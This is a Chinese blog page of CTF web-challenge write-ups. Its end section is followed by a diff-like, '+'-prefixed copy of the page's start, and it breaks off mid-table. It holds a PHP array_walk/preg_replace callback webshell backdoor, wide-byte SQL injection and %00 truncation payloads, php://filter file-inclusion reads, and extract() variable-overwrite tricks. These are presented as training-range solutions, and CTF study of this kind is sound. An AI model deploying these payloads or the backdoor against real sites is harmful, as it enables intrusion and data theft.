magic_quote_gpc 为ON,如果输入</p><p><code>http://www.xxxx.com/index.php?user=11′ and 1=2 #</code></p><p>SQL语句就会变成</p><p><code>SELECT * FROM user WHERE user=’1\’ and 1=2 #’</code></p><p>自动加上了\转义，如果构造特殊的宽字节编码呢？</p><p><code>http://www.xxxx.com/index.php?user=11%df%27 and 1=2 #</code></p><p>SQL语句就变成</p><p><code>SELECT * FROM user WHERE user=’11運’ and 1=2#’</code></p><p>这样就注入上了！</p><p><code>11%df</code>会被解析成<code>11運</code>,而<code>%27</code>被邪恶的解析成<code>&#39;</code>就绕过了gpc转义,就成功构造注入了</p><h1 id="Unix-Linux相关"><a href="#Unix-Linux相关" class="headerlink" title="Unix/Linux相关"></a>Unix/Linux相关</h1><h2 id="bash-history"><a href="#bash-history" class="headerlink" title="bash_history"></a>bash_history</h2><p>Bash shell在<code>~/.bash_history</code>（<code>~/</code>表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个<code>.bash_history</code>文件。</p><p>为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。</p><p>删除方法: 第一步：<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行确定所有用户的<code>.bash_history</code>文件中可以保存的旧命令条数。强烈建议把把<code>/etc/profile</code>文件中的<code>HISTFILESIZE</code>和<code>HISTSIZE</code>行的值设为一个较小的数，比如30。编辑profile文件<code>vi /etc/profile</code>，把下面这行改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HISTFILESIZE=30</span><br><span class="line">HISTSIZE=30</span><br></pre></td></tr></table></figure><p>这表示每个用户的<code>.bash_history</code>文件只可以保存30条旧命令。</p><p>第二步：网管还应该在<code>/etc/skel/.bash_logout</code>文件中添加下面这行<code>rm -f $HOME/.bash_history</code>。这样，当用户每次注销时<code>.bash_history</code>文件都会被删除.</p><h2 id="vi编辑器的备份文件"><a href="#vi编辑器的备份文件" class="headerlink" title="vi编辑器的备份文件"></a>vi编辑器的备份文件</h2><p>linux下一般使用vi编辑器，并且异常退出会留下备份文件<code>xxx.swp</code></p><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="数组回调后门"><a href="#数组回调后门" class="headerlink" title="数组回调后门"></a>数组回调后门</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：利用了php中回调函数的后门，可以使<code>www</code>为<code>preg_replace</code>函数，当<code>array_walk()</code>将函数作用于数组时，POST传入的数据作为<code>preg_replace()</code>的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。</p><p>测试：<br><img src="/2018/10/12/CTF/hdhs.png" alt="image"></p><p><strong>未完待续。。。</strong></p></div><div class="reward-container"><div>您的支持将鼓励我的创作！</div><button onclick='var qr=document.getElementById("qr");qr.style.display="none"===qr.style.display?"block":"none"'>打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/wechatpay.png" alt="苏乞儿 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/alipay.png" alt="苏乞儿 支付宝"><p>支付宝</p></div></div></div><div class="followme"><p>欢迎关注我的其它发布渠道</p><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/atom.xml"><span class="icon"><i class="fa fa-rss"></i></span> <span class="label">RSS</span></a></div></div></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a href="/2018/10/29/记一次CTF大赛的感受/" rel="next" title="记一次CTF大赛的感受">记一次CTF大赛的感受<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div><div class="comments" id="gitalk-container"></div><script>window.addEventListener('tabs:register', () => {
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.suqir.xyz","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"button","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文总结了CTF中我所遇到的题型及其write up，本文长期更新">
+<meta name="keywords" content="博客,苏乞儿,suqir">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF">
+<meta property="og:url" content="https://blog.suqir.xyz/2018/10/12/CTF/index.html">
+<meta property="og:site_name" content="苏乞儿&#39;s Blog">
+<meta property="og:description" content="本文总结了CTF中我所遇到的题型及其write up，本文长期更新">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png">
+<meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/ccdj1.png">
+<meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/AAencode.png">
+<meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/wjbh.png">
+<meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/hdhs.png">
+<meta property="og:updated_time" content="2020-03-18T10:46:48.668Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF">
+<meta name="twitter:description" content="本文总结了CTF中我所遇到的题型及其write up，本文长期更新">
+<meta name="twitter:image" content="https://blog.suqir.xyz/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png">
+
+<link rel="canonical" href="https://blog.suqir.xyz/2018/10/12/CTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>CTF | 苏乞儿's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="苏乞儿's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">苏乞儿's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">人生一世，草木一秋</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-网课宝">
+
+    <a href="http://wk.suqir.xyz/" rel="noopener" target="_blank"><i class="fa fa-fw fa-calendar"></i>网课宝</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="search-pop-overlay">
+  <div class="popup search-popup">
+      <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+  </div>
+</div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.suqir.xyz/2018/10/12/CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://q.qlogo.cn/headimg_dl?dst_uin=977265215&spec=100">
+      <meta itemprop="name" content="苏乞儿">
+      <meta itemprop="description" content="分享一切好玩的事情！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="苏乞儿's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-10-12 17:52:11" itemprop="dateCreated datePublished" datetime="2018-10-12T17:52:11+08:00">2018-10-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-18 18:46:48" itemprop="dateModified" datetime="2020-03-18T18:46:48+08:00">2020-03-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文总结了CTF中我所遇到的题型及其write up，本文长期更新</p>
+<a id="more"></a>
+<p>希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！</p>
+<hr>
+<p>训练场：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南京邮电大学CTF题库</a></p>
+<hr>
+<h1 id="直接查看源码"><a href="#直接查看源码" class="headerlink" title="直接查看源码"></a>直接查看源码</h1><p>出现场景：一般出现在第一题</p>
+<p>write  up： 直接Ctrl+u查看网页源码寻找flag</p>
+<h1 id="修改maxlength"><a href="#修改maxlength" class="headerlink" title="修改maxlength"></a>修改maxlength</h1><p>出现场景：输入框输入内容有位数限制</p>
+<p>write up：F12进入开发者模式修改maxlength后提交</p>
+<h1 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h1><p>各种伪造IP的HTTP头：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>伪造方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>X-Forwarded-For</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Client-IP</td>
+</tr>
+<tr>
+<td>3</td>
+<td>x-remote-IP</td>
+</tr>
+<tr>
+<td>4</td>
+<td>x-originating-IP</td>
+</tr>
+<tr>
+<td>5</td>
+<td>x-remote-addr</td>
+</tr>
+</tbody>
+</table>
+<h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">'1'</span>);</span><br><span class="line">       $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>,因此get方法传值<code>key=0xccccccccc</code></p>
+<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h2><p>介绍：PHP在处理哈希字符串时，会利用“!=”或“==”<br>来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0</p>
+<p>出现场景：PHP代码审计、含md5的题</p>
+<p>write  up：</p>
+<p>修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较</p>
+<p>扩展：0e开头MD5值小结</p>
+<table>
+<thead>
+<tr>
+<th>string</th>
+<th>md5()</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>s878926199a</td>
+<td>0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td>s155964671a</td>
+<td>0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td>s214587387a</td>
+<td>0e848240448830537924465865611904</td>
+</tr>
+</tbody>
+</table>
+<h2 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null）</p>
+<h1 id="脑洞题"><a href="#脑洞题" class="headerlink" title="脑洞题"></a>脑洞题</h1><ol>
+<li>源码找url</li>
+</ol>
+<p><img src="/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png" alt="image"></p>
+<ol start="2">
+<li>源码看flag</li>
+</ol>
+<p><img src="/2018/10/12/CTF/ccdj1.png" alt="image"></p>
+<h1 id="jjencode-aaencode（颜文字）"><a href="#jjencode-aaencode（颜文字）" class="headerlink" title="jjencode/aaencode（颜文字）"></a>jjencode/aaencode（颜文字）</h1><p>介绍：</p>
+<blockquote>
+<p>什么是jjencode?</p>
+<p>将js代码转换成只有符号的字符串</p>
+</blockquote>
+<blockquote>
+<p>什么是aaencode？</p>
+<p>将js代码转换成常用的网络表情</p>
+</blockquote>
+<p>aaencode加密：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p>
+<p>解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。</p>
+<p><img src="/2018/10/12/CTF/AAencode.png" alt="image"></p>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>典型的文件包含漏洞的格式网址：<code>php?file=xxx.php</code></p>
+<p>原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的</p>
+<p>利用方法：构建<code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。</p>
+<p><img src="/2018/10/12/CTF/wjbh.png" alt="image"></p>
+<p>注意：python3中base64的解密为base64.b64decode()</p>
+<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol>
+<li>精度问题</li>
+</ol>
+<p><code>intval()</code>这个函数的作用是把参数自动转换成整数（int）</p>
+<blockquote>
+<p>$id = intval(1024.5)//结果为$id==1024</p>
+</blockquote>
+<h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。</p>
+<h1 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>涉及漏洞：查到资料</p>
+<blockquote>
+<p>1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00</p>
+</blockquote>
+<blockquote>
+<p>2.当ntf为数组时它的返回值不是FALSE</p>
+</blockquote>
+<p>利用方法：</p>
+<blockquote>
+<p>1.?nctf=1%00%23biubiubiu</p>
+</blockquote>
+<blockquote>
+<p>2.?nctf[]=1</p>
+</blockquote>
+<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：<code>extract()</code>函数的作用：从数组中将变量导入到当前的符号表</p>
+<blockquote>
+<p>可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表</p>
+</blockquote>
+<p>由于<code>extract()</code>函数存在变量覆盖漏洞，所以提交post参数：</p>
+<p><code>pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123</code></p>
+<p>即:将两个变量的值修改成相同的，即可得到flag！</p>
+<h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件上传<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"dir"</span> <span class="attr">value</span>=<span class="string">"/uploads/"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h2><p>绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="正常闭合"><a href="#正常闭合" class="headerlink" title="正常闭合"></a>正常闭合</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br></pre></td></tr></table></figure>
+<p>分析：会对传入参数两端去空格，然后sql拼接如下</p>
+<p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code></p>
+<p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。</p>
+<p>MySQL主要有三种注释方式：</p>
+<table>
+<thead>
+<tr>
